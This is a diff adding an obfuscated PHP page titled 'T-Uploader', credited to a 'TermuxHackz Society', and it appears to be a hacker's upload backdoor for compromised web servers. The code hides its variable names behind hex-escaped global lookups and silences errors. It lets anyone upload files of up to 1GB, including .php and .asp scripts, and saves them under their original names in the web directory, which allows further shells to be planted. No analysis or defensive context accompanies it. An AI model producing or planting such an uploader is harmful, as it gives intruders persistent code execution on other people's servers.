@@ -1,0 +1,92 @@
+?>
+
+<?php ${"\x47L\x4fB\x41\x4c\x53"}["y\x62\x72\x68o\x65a\x63\x67\x7ay\x6du\x5fs\x62\x6dx\x78\x6bo\x78\x5f\x70\x62w\x73m\x73t\x5fd\x67\x73v"]="_\x53E\x52V\x45R";${"\x47\x4cO\x42A\x4cS"}["p\x76\x5f\x61k\x76e\x68a\x64x\x62\x61\x69\x6fx\x66\x7ar\x5f\x70_\x79u\x74m\x67\x72n\x78p\x63"]="\x5fF\x49\x4cE\x53";${"\x47L\x4fB\x41L\x53"}["\x65\x6d\x7ax\x65\x6en\x6fx\x67o\x68n\x5fb\x76\x68d\x68\x6d_\x61f\x64"]="\x6ee\x77n\x61m\x65";${"\x47L\x4f\x42\x41L\x53"}["\x71p\x73d\x67g\x72b\x6av\x6dr\x64e\x65k\x76h\x78\x76p\x5f\x6bq\x7at\x62"]="\x65r\x72o\x72\x73";${"G\x4cO\x42A\x4c\x53"}["\x63m\x72v\x5fi\x75\x6d\x76w\x68\x6a\x79u\x78w\x77n\x6d\x67\x64s\x73\x6fh\x77x"]="\x66i\x6c\x65_\x65x\x74";${"\x47\x4c\x4f\x42A\x4c\x53"}["w\x74\x7a\x6eh\x67\x72d\x67\x70r\x6ak\x66c\x6af\x74i\x6b_\x77\x6ca\x77"]="\x65x\x74e\x6e\x73i\x6f\x6es";?><?php   ?><!DOCTYPE html><meta name="viewport" content="width=device-width initial-scale=1"><meta charset="utf-8"><head><title>---[<<-T-Uploader-->>]----</title></head><style>.left {	text-align: left;	color: white;	font-size: 16px;
+
+}</style><html><body><style>* {
+
+padding: 0;
+
+margin: 0;
+
+font-family: Tahoma, Verdana, sans-serif;
+
+}
+
+body {
+
+color: lightgreen;
+
+font-family: Tahoma, Verdana, sans-serif;
+
+}
+
+.container {
+
+display: block;
+
+}
+
+.text1 {
+
+color: orange;
+
+font-size: 60px;
+
+font-weight: 900;
+
+font-family: serif;
+
+text-align: center;
+
+letter-spacing: 6px;
+
+animation: effect 2s linear infinite;
+
+cursor: pointer;
+
+}
+
+@keyframes effect {	0% {	color: orange;	-webkit-background-clip: text;	}	20% {	color: lightgreen;	font-weight: bold;	}	50% {	color: #3ce7d7;	-webkit-background-clip: text;	}	60% {	color: blue;	-webkit-background-clip: text;	}	70% {	color: cyan;	}	100% {	color: linear-gradient(#3ce7d7, #000fff);	-webkit-background-clip: text;	}
+
+}
+
+a {	color: lightblue;	text-decoration: none;
+
+}</style><br><br><style>body {
+
+background: #333;
+
+font-family: "Lucida Console", "Courier New", monospace;
+
+font-size: 16px;
+
+text-align: center;
+
+color: lightgreen;
+
+}
+
+.button-3 { appearance: none; background-color: #2ea44f; border: 1px solid rgba(27, 31, 35, .15); border-radius: 6px; box-shadow: rgba(27, 31, 35, .1) 0 1px 0; box-sizing: border-box; color: #fff; cursor: pointer; display: inline-block; font-family: -apple-system,system-ui,"Segoe UI",Helvetica,Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji"; font-size: 14px; font-weight: 600; line-height: 20px; padding: 6px 16px; position: relative; text-align: center; text-decoration: none; user-select: none; -webkit-user-select: none; touch-action: manipulation; vertical-align: middle; white-space: nowrap;
+
+}
+
+.button-3:focus:not(:focus-visible):not(.focus-visible) { box-shadow: none; outline: none;
+
+}
+
+.button-3:hover { background-color: #2c974b;
+
+}
+
+.button-3:focus { box-shadow: rgba(46, 164, 79, .4) 0 0 0 3px; outline: none;
+
+}
+
+.button-3:disabled { background-color: #94d3a2; border-color: rgba(27, 31, 35, .1); color: rgba(255, 255, 255, .8); cursor: default;
+
+}
+
+.button-3:active { background-color: #298e46; box-shadow: rgba(20, 70, 32, .2) 0 1px 0 inset;
+
+}</style><?php  error_reporting(0);ini_set('display_errors',0) ?><h3 class="text1">T-UPLOADER</h3><span class="text2">Created by TermuxHackz Society</span><form action="<?php echo ${${"G\x4c\x4f\x42A\x4c\x53"}["y\x62\x72\x68o\x65a\x63\x67\x7ay\x6du\x5fs\x62\x6dx\x78\x6bo\x78\x5f\x70\x62w\x73m\x73t\x5fd\x67\x73v"]}['PHP_SELF'] ?>" method="POST" enctype="multipart/form-data"><label class="col-md-3 control-label">Upload file</label><input type="file" name="attachment" class="form-control-file" /><button type="submit" role="button" class="button-3">Upload</button></form><br/><br/><br><br><?php if(is_uploaded_file(${${"G\x4cO\x42A\x4cS"}["p\x76\x5f\x61k\x76e\x68a\x64x\x62\x61\x69\x6fx\x66\x7ar\x5f\x70_\x79u\x74m\x67\x72n\x78p\x63"]}['attachment']['tmp_name'])){${${"\x47L\x4fB\x41L\x53"}["\x65\x6d\x7ax\x65\x6en\x6fx\x67o\x68n\x5fb\x76\x68d\x68\x6d_\x61f\x64"]}=dirname(__FILE__)."\x2f".basename(${${"G\x4c\x4fB\x41L\x53"}["p\x76\x5f\x61k\x76e\x68a\x64x\x62\x61\x69\x6fx\x66\x7ar\x5f\x70_\x79u\x74m\x67\x72n\x78p\x63"]}['attachment']['name']);if(${${"G\x4c\x4fB\x41L\x53"}["p\x76\x5f\x61k\x76e\x68a\x64x\x62\x61\x69\x6fx\x66\x7ar\x5f\x70_\x79u\x74m\x67\x72n\x78p\x63"]}['attachment']['size']>1073741824){${${"G\x4cO\x42A\x4cS"}["\x71p\x73d\x67g\x72b\x6av\x6dr\x64e\x65k\x76h\x78\x76p\x5f\x6bq\x7at\x62"]}[]="\x46\x69\x6ce\x20s\x69\x7a\x65 \x6d\x75\x73t\x20b\x65\x20e\x78\x61\x63t\x6c\x79\x201\x47\x42";}${${"\x47L\x4fB\x41\x4c\x53"}["\x63m\x72v\x5fi\x75\x6d\x76w\x68\x6a\x79u\x78w\x77n\x6d\x67\x64s\x73\x6fh\x77x"]}=strtolower(end(explode('.',${${"\x47\x4cO\x42A\x4cS"}["p\x76\x5f\x61k\x76e\x68a\x64x\x62\x61\x69\x6fx\x66\x7ar\x5f\x70_\x79u\x74m\x67\x72n\x78p\x63"]}['attachment']['name'])));${${"G\x4c\x4f\x42A\x4cS"}["w\x74\x7a\x6eh\x67\x72d\x67\x70r\x6ak\x66c\x6af\x74i\x6b_\x77\x6ca\x77"]}=array("pdf","doc","jpg","png","txt","php","mp4","mp3","asp","docx","html","mhtml","zip","rar");if(in_array(${${"G\x4cO\x42A\x4c\x53"}["\x63m\x72v\x5fi\x75\x6d\x76w\x68\x6a\x79u\x78w\x77n\x6d\x67\x64s\x73\x6fh\x77x"]},${${"G\x4cO\x42\x41\x4cS"}["w\x74\x7a\x6eh\x67\x72d\x67\x70r\x6ak\x66c\x6af\x74i\x6b_\x77\x6ca\x77"]})===false){${${"\x47\x4cO\x42A\x4cS"}["\x71p\x73d\x67g\x72b\x6av\x6dr\x64e\x65k\x76h\x78\x76p\x5f\x6bq\x7at\x62"]}[]="F\x69l\x65\x20e\x78t\x65\x6es\x69\x6f\x6e \x6e\x6ft\x20a\x6cl\x6f\x77e\x64,\x20p\x6ce\x61\x73e\x20c\x68o\x6f\x73e\x20\x61 \x50D\x46,\x20D\x4fC\x2c\x20D\x4fC\x58,\x20J\x50\x47\x2c\x20P\x4eG\x2c \x54\x58T\x20\x66\x69l\x65.";}if(empty(${${"\x47L\x4fB\x41\x4c\x53"}["\x71p\x73d\x67g\x72b\x6av\x6dr\x64e\x65k\x76h\x78\x76p\x5f\x6bq\x7at\x62"]})==true){if(!(move_uploaded_file(${${"\x47L\x4f\x42A\x4c\x53"}["p\x76\x5f\x61k\x76e\x68a\x64x\x62\x61\x69\x6fx\x66\x7ar\x5f\x70_\x79u\x74m\x67\x72n\x78p\x63"]}['attachment']['tmp_name'],${${"\x47L\x4fB\x41L\x53"}["\x65\x6d\x7ax\x65\x6en\x6fx\x67o\x68n\x5fb\x76\x68d\x68\x6d_\x61f\x64"]}))){echo "<\x70\x3e\x45\x52R\x4fR\x3a \x20A\x20p\x72o\x62l\x65m\x20\x6f\x63c\x75\x72r\x65d\x20\x64u\x72\x69n\x67 \x66\x69\x6c\x65\x20u\x70\x6c\x6f\x61d\x21<\x2f\x70>\n";}else{echo "<\x62\x72\x3e";echo "\x3c\x70\x3e\x54\x68\x65\x20\x66\x69\x6c\x65\x20\x68\x61\x73\x20\x62\x65\x65\x6e\x20\x75\x70\x6c\x6f\x61\x64\x65\x64\x20\x74\x6f\x3a\x20{${${"\x47L\x4f\x42\x41L\x53"}["\x65\x6d\x7ax\x65\x6en\x6fx\x67o\x68n\x5fb\x76\x68d\x68\x6d_\x61f\x64"]}}\x3c\x2f\x70\x3e\n";}}else{print_r(${${"\x47L\x4fB\x41L\x53"}["\x71p\x73d\x67g\x72b\x6av\x6dr\x64e\x65k\x76h\x78\x76p\x5f\x6bq\x7at\x62"]});}} ?></body></html>
+
